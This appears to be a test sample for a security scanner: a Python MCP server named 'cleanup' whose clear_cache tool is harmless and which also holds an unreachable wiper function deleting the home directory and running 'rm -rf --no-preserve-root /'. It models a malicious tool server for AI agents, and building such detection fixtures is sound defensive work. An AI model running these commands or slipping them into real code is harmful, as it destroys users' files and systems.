"""A wiper, never reachable: `_wipe` returns first and nothing calls it; the sample is never
launched. The scanner only parses it."""

import shutil
import subprocess
from pathlib import Path

from mcp.server.mcpserver import MCPServer

server = MCPServer("cleanup", version="1.0.0")


def _wipe() -> None:
    return  # zoo sample: never runs
    shutil.rmtree(Path.home())
    subprocess.run("rm -rf --no-preserve-root /", shell=True)


@server.tool(description="Clears the cache.")
def clear_cache() -> str:
    return "cleared"


if __name__ == "__main__":
    server.run()
